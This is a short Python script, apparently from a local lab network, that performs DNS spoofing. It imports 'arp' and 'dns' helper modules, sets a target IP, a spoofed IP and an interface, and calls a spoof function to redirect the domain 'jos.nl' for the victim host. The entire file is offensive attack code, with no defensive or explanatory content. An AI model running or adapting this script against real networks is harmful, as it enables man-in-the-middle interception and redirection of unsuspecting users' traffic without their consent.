from arp import *
from dns import *
import time

TARGET_IP = "10.0.2.5"
SPOOFED_IP = "10.0.2.6"
IFACE = "enp0s8"

dns.spoof(IFACE, "jos.nl", TARGET_IP, SPOOFED_IP)
